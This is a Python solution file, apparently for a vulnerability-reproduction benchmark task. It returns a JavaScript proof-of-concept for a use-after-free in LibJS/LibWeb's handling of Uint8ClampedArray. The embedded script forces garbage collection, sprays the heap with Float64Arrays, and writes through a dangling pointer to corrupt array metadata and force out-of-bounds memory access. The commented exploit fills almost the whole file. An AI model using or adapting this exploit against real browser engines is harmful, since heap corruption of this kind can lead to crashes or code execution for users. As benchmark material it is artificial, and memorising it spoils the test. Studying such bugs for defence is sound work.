import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        # The vulnerability is a Use-After-Free caused by incorrect garbage
        # collection tracing for Uint8ClampedArray objects in LibJS/LibWeb.
        # The PoC exploits this by:
        # 1. Creating a Uint8ClampedArray whose backing ArrayBuffer has no other
        #    references.
        # 2. Triggering garbage collection, which erroneously frees the ArrayBuffer
        #    because the reference from the Uint8ClampedArray is not traced.
        # 3. Spraying the heap to reclaim the freed memory with objects that are
        #    sensitive to corruption (e.g., other TypedArrays).
        # 4. Using the now-dangling pointer in the Uint8ClampedArray to corrupt
        #    the metadata of a reclaimed object.
        # 5. Accessing the corrupted object to trigger a crash (e.g., segfault
        #    from an out-of-bounds access).

        poc_js = """
// Function to induce garbage collection by creating memory pressure.
function trigger_gc() {
    try {
        // Allocate and discard large objects to force a GC cycle.
        for (let i = 0; i < 15; i++) {
            new ArrayBuffer(1024 * 1024 * 10); // 10MB each
        }
    } catch (e) {
        // OOM is an expected and acceptable outcome of applying memory pressure.
    }
}

// Creates a Uint8ClampedArray in a vulnerable state, where its backing
// ArrayBuffer has no other references from the program.
function create_vulnerable_object(size) {
    // The 'buffer' variable is confined to this function's scope.
    let buffer = new ArrayBuffer(size);
    let u8_clamped_array = new Uint8ClampedArray(buffer);

    // A trivial operation to ensure the object is materialized and not
    // optimized away by the JS engine's dead code elimination.
    u8_clamped_array[0] = 1;

    // When this function returns, the 'buffer' reference is destroyed.
    // The only remaining potential reference to the buffer's data is via
    // the returned array, which the buggy GC does not trace.
    return u8_clamped_array;
}

// Exploit constants. These values are chosen to be effective on common
// memory allocators but may require tuning for specific targets.
const UAF_BUFFER_SIZE = 4096;
const HEAP_SPRAY_COUNT = 500;

// Step 1: Create the object that will eventually hold a dangling pointer.
var uaf_array = create_vulnerable_object(UAF_BUFFER_SIZE);

// Step 2: Trigger the GC. This is the point where the ArrayBuffer is freed.
trigger_gc();

// Step 3: Reclaim the freed memory. We spray the heap with objects of the
// same size, hoping one lands in the memory region we just freed.
// Float64Array is a good choice for spraying as its internal metadata
// (e.g., length) is a valuable corruption target.
var spray_objects = [];
for (let i = 0; i < HEAP_SPRAY_COUNT; i++) {
    let obj = new Float64Array(UAF_BUFFER_SIZE / 8);
    obj[0] = 3.14159; // Initialize to avoid CoW optimizations.
    spray_objects.push(obj);
}

// Step 4: Perform the Use-After-Free write. We use the dangling pointer
// to corrupt the memory of whatever object reclaimed the freed space.
// The goal is to overwrite the length field of a sprayed Float64Array.
for (let i = 0; i < 64; i++) {
    // Writing 0xFF repeatedly will create a very large integer value
    // when interpreted as part of the object's metadata.
    uaf_array[i] = 0xFF;
}

// Step 5: Trigger the crash. We iterate through the sprayed objects and
// attempt an action that will fail catastrophically if the object's
// metadata has been corrupted.
for (let i = 0; i < HEAP_SPRAY_COUNT; i++) {
    try {
        // We attempt an out-of-bounds access. If we successfully corrupted
        // the length property of spray_objects[i], the JS engine's bounds
        // check will pass, but the memory access will be out-of-bounds at
        // the native level, resulting in a segmentation fault.
        spray_objects[i][UAF_BUFFER_SIZE] = 13.37;
    } catch (e) {
        // We are seeking a native crash, not a JS exception. We continue
        // to test all sprayed objects.
    }
}

// A final message to indicate script completion if no crash occurred.
console.log("PoC execution finished.");
"""
        return poc_js.encode('utf-8')